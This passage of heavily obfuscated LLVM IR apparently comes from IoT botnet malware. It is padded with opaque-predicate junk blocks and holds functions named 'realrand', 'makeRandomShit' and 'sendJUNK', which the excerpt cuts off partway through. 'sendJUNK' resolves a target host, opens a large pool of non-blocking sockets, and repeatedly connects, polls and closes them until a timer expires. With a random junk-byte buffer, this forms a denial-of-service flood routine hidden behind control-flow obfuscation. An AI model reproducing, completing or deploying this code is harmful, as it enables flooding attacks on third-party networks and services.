  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %255, i32 0, i32 1
  store i8 0, i8* %256, align 4
  br label %262

; <label>:257:                                    ; preds = %236
  %258 = load i32, i32* %8, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %259
  %261 = getelementptr inbounds %struct.state_t, %struct.state_t* %260, i32 0, i32 1
  store i8 2, i8* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %257, %246
  br label %278

; <label>:263:                                    ; preds = %205
  %264 = load i32, i32* %15, align 4
  %265 = icmp eq i32 %264, -1
  br i1 %265, label %266, label %277

; <label>:266:                                    ; preds = %263
  %267 = load i32, i32* %8, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %268
  %270 = getelementptr inbounds %struct.state_t, %struct.state_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 8
  %272 = call i32 @close(i32 %271)
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %274
  %276 = getelementptr inbounds %struct.state_t, %struct.state_t* %275, i32 0, i32 1
  store i8 0, i8* %276, align 4
  br label %277

; <label>:277:                                    ; preds = %266, %263
  br label %278

; <label>:278:                                    ; preds = %277, %262
  br label %365

; <label>:279:                                    ; preds = %originalBBpart216
  %280 = load i32, i32* @x.95
  %281 = load i32, i32* @y.96
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %279
  %288 = load i32, i32* @x.95
  %289 = load i32, i32* @y.96
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %296

; <label>:296:                                    ; preds = %originalBBpart224
  %297 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %298 = getelementptr inbounds [16 x i64], [16 x i64]* %297, i64 0, i64 0
  %299 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %298) #2, !srcloc !8
  %300 = extractvalue { i64, i64* } %299, 0
  %301 = extractvalue { i64, i64* } %299, 1
  %302 = trunc i64 %300 to i32
  store i32 %302, i32* %20, align 4
  %303 = ptrtoint i64* %301 to i64
  %304 = trunc i64 %303 to i32
  store i32 %304, i32* %21, align 4
  br label %305

; <label>:305:                                    ; preds = %296
  %306 = load i32, i32* @x.95
  %307 = load i32, i32* @y.96
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %305
  %314 = load i32, i32* @x.95
  %315 = load i32, i32* @y.96
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %322

; <label>:322:                                    ; preds = %originalBBpart228
  %323 = load i32, i32* %8, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %324
  %326 = getelementptr inbounds %struct.state_t, %struct.state_t* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 8
  %328 = srem i32 %327, 64
  %329 = zext i32 %328 to i64
  %330 = shl i64 1, %329
  %331 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %332 = load i32, i32* %8, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %333
  %335 = getelementptr inbounds %struct.state_t, %struct.state_t* %334, i32 0, i32 0
  %336 = load i32, i32* %335, align 8
  %337 = sdiv i32 %336, 64
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds [16 x i64], [16 x i64]* %331, i64 0, i64 %338
  %340 = load i64, i64* %339, align 8
  %341 = or i64 %340, %330
  store i64 %341, i64* %339, align 8
  %342 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %342, align 8
  %343 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %343, align 8
  %344 = load i32, i32* %8, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %345
  %347 = getelementptr inbounds %struct.state_t, %struct.state_t* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 8
  %349 = add nsw i32 %348, 1
  %350 = call i32 @select(i32 %349, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %350, i32* %15, align 4
  %351 = load i32, i32* %15, align 4
  %352 = icmp ne i32 %351, 0
  br i1 %352, label %353, label %364

; <label>:353:                                    ; preds = %322
  %354 = load i32, i32* %8, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %355
  %357 = getelementptr inbounds %struct.state_t, %struct.state_t* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 8
  %359 = call i32 @close(i32 %358)
  %360 = load i32, i32* %8, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %361
  %363 = getelementptr inbounds %struct.state_t, %struct.state_t* %362, i32 0, i32 1
  store i8 0, i8* %363, align 4
  br label %364

; <label>:364:                                    ; preds = %353, %322
  br label %365

; <label>:365:                                    ; preds = %364, %278, %193, %originalBBpart216
  br label %366

; <label>:366:                                    ; preds = %365
  %367 = load i32, i32* @x.95
  %368 = load i32, i32* @y.96
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %366
  %375 = load i32, i32* %8, align 4
  %376 = add nsw i32 %375, 1
  store i32 %376, i32* %8, align 4
  %377 = load i32, i32* @x.95
  %378 = load i32, i32* @y.96
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br label %104

; <label>:385:                                    ; preds = %104
  br label %66

; <label>:386:                                    ; preds = %originalBBpart28
  %387 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %387)
  br label %388

; <label>:388:                                    ; preds = %386, %33
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %389 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %390 = getelementptr inbounds [8 x i8], [8 x i8]* %389, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %390, i8 0, i64 8, i32 4, i1 false)
  %391 = load i32, i32* %7, align 4
  %392 = zext i32 %391 to i64
  %393 = call i8* @llvm.stacksave()
  store i8* %393, i8** %10, align 8
  %394 = alloca %struct.state_t, i64 %392, align 16
  %395 = bitcast %struct.state_t* %394 to i8*
  %396 = load i32, i32* %7, align 4
  %397 = sext i32 %396 to i64
  %_ = shl i64 %397, 5
  %_1 = sub i64 0, %397
  %gen = add i64 %_1, 5
  %_2 = sub i64 %397, 5
  %gen3 = mul i64 %_2, 5
  %_4 = sub i64 %397, 5
  %gen5 = mul i64 %_4, 5
  %398 = mul i64 %397, 5
  call void @llvm.memset.p0i8.i64(i8* %395, i8 0, i64 %398, i32 16, i1 false)
  %399 = call i64 @time(i64* null) #2
  %400 = load i32, i32* %6, align 4
  %401 = sext i32 %400 to i64
  %402 = add nsw i64 %399, %401
  %403 = trunc i64 %402 to i32
  store i32 %403, i32* %16, align 4
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %404 = load i32, i32* %16, align 4
  %405 = sext i32 %404 to i64
  %406 = call i64 @time(i64* null) #2
  %407 = icmp sgt i64 %405, %406
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %87
  store i32 0, i32* %8, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %108
  %408 = load i32, i32* %8, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %409
  %411 = getelementptr inbounds %struct.state_t, %struct.state_t* %410, i32 0, i32 1
  %412 = load i8, i8* %411, align 4
  %413 = zext i8 %412 to i32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %172
  %414 = load i32, i32* %8, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %415
  %417 = getelementptr inbounds %struct.state_t, %struct.state_t* %416, i32 0, i32 1
  store i8 1, i8* %417, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %279
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %305
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %366
  %418 = load i32, i32* %8, align 4
  %_31 = sub i32 %418, 1
  %gen32 = mul i32 %_31, 1
  %_33 = shl i32 %418, 1
  %_34 = shl i32 %418, 1
  %_35 = sub i32 %418, 1
  %gen36 = mul i32 %_35, 1
  %419 = add nsw i32 %418, 1
  store i32 %419, i32* %8, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define i32 @realrand(i32, i32) #0 {
  %3 = load i32, i32* @x.97
  %4 = load i32, i32* @y.98
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i32 %1, i32* %12, align 4
  %13 = call i64 @time(i64* null) #2
  %14 = call i32 @getpid() #2
  %15 = sext i32 %14 to i64
  %16 = add nsw i64 %13, %15
  %17 = trunc i64 %16 to i32
  call void @srand(i32 %17) #2
  %18 = call i32 @rand() #2
  %19 = load i32, i32* %12, align 4
  %20 = add nsw i32 %19, 1
  %21 = load i32, i32* %11, align 4
  %22 = sub nsw i32 %20, %21
  %23 = srem i32 %18, %22
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %23, %24
  %26 = load i32, i32* @x.97
  %27 = load i32, i32* @y.98
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %25

originalBBalteredBB:                              ; preds = %originalBB, %2
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i32 %0, i32* %34, align 4
  store i32 %1, i32* %35, align 4
  %36 = call i64 @time(i64* null) #2
  %37 = call i32 @getpid() #2
  %38 = sext i32 %37 to i64
  %_ = sub i64 %36, %38
  %gen = mul i64 %_, %38
  %_1 = shl i64 %36, %38
  %_2 = sub i64 0, %36
  %gen3 = add i64 %_2, %38
  %_4 = shl i64 %36, %38
  %_5 = shl i64 %36, %38
  %_6 = shl i64 %36, %38
  %_7 = sub i64 %36, %38
  %gen8 = mul i64 %_7, %38
  %_9 = shl i64 %36, %38
  %39 = add nsw i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #2
  %41 = call i32 @rand() #2
  %42 = load i32, i32* %35, align 4
  %_10 = sub i32 %42, 1
  %gen11 = mul i32 %_10, 1
  %43 = add nsw i32 %42, 1
  %44 = load i32, i32* %34, align 4
  %_12 = sub i32 0, %43
  %gen13 = add i32 %_12, %44
  %_14 = sub i32 %43, %44
  %gen15 = mul i32 %_14, %44
  %_16 = sub i32 %43, %44
  %gen17 = mul i32 %_16, %44
  %_18 = sub i32 0, %43
  %gen19 = add i32 %_18, %44
  %_20 = shl i32 %43, %44
  %_21 = sub i32 0, %43
  %gen22 = add i32 %_21, %44
  %_23 = sub i32 0, %43
  %gen24 = add i32 %_23, %44
  %_25 = shl i32 %43, %44
  %_26 = sub i32 0, %43
  %gen27 = add i32 %_26, %44
  %_28 = sub i32 0, %43
  %gen29 = add i32 %_28, %44
  %45 = sub nsw i32 %43, %44
  %_30 = sub i32 %41, %45
  %gen31 = mul i32 %_30, %45
  %_32 = sub i32 0, %41
  %gen33 = add i32 %_32, %45
  %_34 = sub i32 0, %41
  %gen35 = add i32 %_34, %45
  %_36 = shl i32 %41, %45
  %_37 = sub i32 0, %41
  %gen38 = add i32 %_37, %45
  %_39 = shl i32 %41, %45
  %46 = srem i32 %41, %45
  %47 = load i32, i32* %34, align 4
  %_40 = sub i32 0, %46
  %gen41 = add i32 %_40, %47
  %_42 = sub i32 %46, %47
  %gen43 = mul i32 %_42, %47
  %_44 = sub i32 0, %46
  %gen45 = add i32 %_44, %47
  %_46 = sub i32 0, %46
  %gen47 = add i32 %_46, %47
  %_48 = sub i32 0, %46
  %gen49 = add i32 %_48, %47
  %_50 = sub i32 %46, %47
  %gen51 = mul i32 %_50, %47
  %_52 = sub i32 %46, %47
  %gen53 = mul i32 %_52, %47
  %_54 = sub i32 %46, %47
  %gen55 = mul i32 %_54, %47
  %_56 = sub i32 0, %46
  %gen57 = add i32 %_56, %47
  %48 = add nsw i32 %46, %47
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define void @makeRandomShit(i8*, i32) #0 {
  %3 = load i32, i32* @x.99
  %4 = load i32, i32* @y.100
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %14 = call i64 @time(i64* null) #2
  %15 = trunc i64 %14 to i32
  call void @srand(i32 %15) #2
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %16 = load i32, i32* @x.99
  %17 = load i32, i32* @y.100
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %originalBBpart222, %originalBBpart2
  %25 = load i32, i32* %13, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %72

; <label>:28:                                     ; preds = %24
  %29 = load i32, i32* @x.99
  %30 = load i32, i32* @y.100
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = call i32 @rand() #2
  %38 = srem i32 %37, 255
  %39 = add nsw i32 %38, 1
  %40 = trunc i32 %39 to i8
  %41 = load i8*, i8** %11, align 8
  %42 = load i32, i32* %13, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  store i8 %40, i8* %44, align 1
  %45 = load i32, i32* @x.99
  %46 = load i32, i32* @y.100
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %53

; <label>:53:                                     ; preds = %originalBBpart215
  %54 = load i32, i32* @x.99
  %55 = load i32, i32* @y.100
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %53
  %62 = load i32, i32* %13, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %13, align 4
  %64 = load i32, i32* @x.99
  %65 = load i32, i32* @y.100
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart222, label %originalBB17alteredBB

originalBBpart222:                                ; preds = %originalBB17
  br label %24

; <label>:72:                                     ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %73 = alloca i8*, align 8
  %74 = alloca i32, align 4
  %75 = alloca i32, align 4
  store i8* %0, i8** %73, align 8
  store i32 %1, i32* %74, align 4
  %76 = call i64 @time(i64* null) #2
  %77 = trunc i64 %76 to i32
  call void @srand(i32 %77) #2
  store i32 0, i32* %75, align 4
  store i32 0, i32* %75, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %78 = call i32 @rand() #2
  %_ = sub i32 %78, 255
  %gen = mul i32 %_, 255
  %_2 = sub i32 0, %78
  %gen3 = add i32 %_2, 255
  %_4 = shl i32 %78, 255
  %_5 = shl i32 %78, 255
  %_6 = sub i32 %78, 255
  %gen7 = mul i32 %_6, 255
  %79 = srem i32 %78, 255
  %_8 = sub i32 0, %79
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %79
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %79, 1
  %_13 = shl i32 %79, 1
  %80 = add nsw i32 %79, 1
  %81 = trunc i32 %80 to i8
  %82 = load i8*, i8** %11, align 8
  %83 = load i32, i32* %13, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  store i8 %81, i8* %85, align 1
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %53
  %86 = load i32, i32* %13, align 4
  %_18 = shl i32 %86, 1
  %_19 = shl i32 %86, 1
  %_20 = shl i32 %86, 1
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %13, align 4
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %350

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  store i32 1024, i32* %17, align 4
  %47 = call i64 @time(i64* null) #2
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add nsw i64 %47, %49
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %18, align 4
  br label %52

; <label>:52:                                     ; preds = %331, %34
  %53 = load i32, i32* %18, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @time(i64* null) #2
  %56 = icmp sgt i64 %54, %55
  br i1 %56, label %57, label %332

; <label>:57:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %58

; <label>:58:                                     ; preds = %328, %57
  %59 = load i32, i32* @x.101
  %60 = load i32, i32* @y.102
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* %8, align 4
  %68 = load i32, i32* %7, align 4
  %69 = icmp slt i32 %67, %68
  %70 = load i32, i32* @x.101
  %71 = load i32, i32* @y.102
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %69, label %78, label %331

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 1
  %83 = load i8, i8* %82, align 4
  %84 = zext i8 %83 to i32
  switch i32 %84, label %327 [
    i32 0, label %85
    i32 1, label %148
    i32 2, label %265
  ]

; <label>:85:                                     ; preds = %78
  %86 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %87 = load i32, i32* %8, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %88
  %90 = getelementptr inbounds %struct.state_t, %struct.state_t* %89, i32 0, i32 0
  store i32 %86, i32* %90, align 8
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %92
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = load i32, i32* %8, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %97
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 8
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %100, i32 3, i8* null)
  %102 = or i32 %101, 2048
  %103 = call i32 (i32, i32, ...) @fcntl(i32 %95, i32 4, i32 %102)
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @connect(i32 %108, %struct.sockaddr* %112, i32 16)
  %114 = icmp ne i32 %113, -1
  br i1 %114, label %119, label %115

; <label>:115:                                    ; preds = %85
  %116 = call i32* @__errno_location() #13
  %117 = load i32, i32* %116, align 4
  %118 = icmp ne i32 %117, 115
  br i1 %118, label %119, label %142

; <label>:119:                                    ; preds = %115, %85
  %120 = load i32, i32* @x.101
  %121 = load i32, i32* @y.102
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %119
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = call i32 @close(i32 %132)
  %134 = load i32, i32* @x.101
  %135 = load i32, i32* @y.102
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %147

; <label>:142:                                    ; preds = %115
  %143 = load i32, i32* %8, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %144
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %145, i32 0, i32 1
  store i8 1, i8* %146, align 4
  br label %147

; <label>:147:                                    ; preds = %142, %originalBBpart24
  br label %327

; <label>:148:                                    ; preds = %78
  %149 = load i32, i32* @x.101
  %150 = load i32, i32* @y.102
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %148
  %157 = load i32, i32* @x.101
  %158 = load i32, i32* @y.102
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %165

; <label>:165:                                    ; preds = %originalBBpart28
  %166 = load i32, i32* @x.101
  %167 = load i32, i32* @y.102
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %165
  %174 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %175 = getelementptr inbounds [16 x i64], [16 x i64]* %174, i64 0, i64 0
  %176 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %175) #2, !srcloc !9
  %177 = extractvalue { i64, i64* } %176, 0
  %178 = extractvalue { i64, i64* } %176, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %20, align 4
  %180 = ptrtoint i64* %178 to i64
  %181 = trunc i64 %180 to i32
